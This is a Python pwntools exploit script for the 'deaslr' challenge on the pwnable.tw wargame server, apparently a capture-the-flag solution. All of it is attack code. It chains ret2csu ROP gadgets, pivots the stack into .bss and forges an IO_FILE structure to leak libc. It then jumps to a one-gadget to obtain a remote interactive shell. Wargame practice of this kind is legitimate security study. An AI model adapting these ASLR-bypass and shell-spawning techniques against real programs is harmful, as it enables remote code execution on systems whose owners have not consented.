#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
os.environ["LD_LIBRARY_PATH"]="./"
context.log_level="debug"
pwn_file="./deaslr"
elf=ELF(pwn_file)
libc_address=0
if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("chall.pwnable.tw",10402)
    pid=0

def debug():
    log.debug("libc address:0x%x"%libc_address)
    log.debug("process pid:%d"%pid)
    pause()

rop="a"*0x10
rop+=p64(0x601a00)
rop+=p64(0x40053e)
conn.sendline(rop)# payload in stack

rop="a"*0x10
rop+=p64(0)
rop+=p64(0x4005BA)# ret to csu
rop+=p64(0)
rop+=p64(1)
rop+=p64(0x600FF0)# gets
rop+=p64(0)*2
rop+=p64(0x601a00)# rdi
rop+=p64(0x4005A0)# call [r12]
rop+="a"*8# add rsp,8
rop+=p64(0)#rbx
rop+=p64(1)#rbp
rop+=p64(0x600ff0)#r12
rop+=p64(0)*2
rop+=p64(0x601a00)# r15
rop+=(p64(0x4005D8)+p64(0))*50# add rsp+8
rop+=p64(0x4005A0)# call [r12]
rop+="a"*8
rop+=p64(0)
rop+=p64(1)
rop+=p64(0x600ff0)#r12
rop+=p64(0)*2
rop+=p64(0x601a28)#r15
rop+=p64(0x4005A0)# call [r12]
#jump to 0x601a00
rop+=p64(0)*2+p64(0x601a00)+p64(0)*4
rop+=p64(0x400554)# leave ret
rop+=p64(0)
# we fake IO_File struct here
f={
    0x70:p32(1),
    0x74:p64(2),
}
rop+=fit(f)
conn.sendline(rop)# leak libc in bss 
conn.sendline("a")
#start at 0x601a00 size=0x20
rop=p64(0)+p64(0x4005BA)
rop+=p64(0x6a623)
rop+=p64(0x6a623+1)#rbp
conn.sendline(rop)
debug()
# start at 0x601a28
rop=p64(8)# r13
rop+=p64(0x600ff0)# got of gets
rop+=p64(0x601e30)# IO_FILE
rop+=p64(0x4005A0)#call [r12] _IO_file_write
rop+=p64(0)*7#TODO we get libc now
rop+=p64(0x400536)
conn.sendline(rop)
libc_address=u64(conn.recv().ljust(8,"\x00"))-0x6ed80
conn.sendline("a"*0x18+p64(libc_address+0x4526a)+"\x00"*0x50)
conn.interactive()






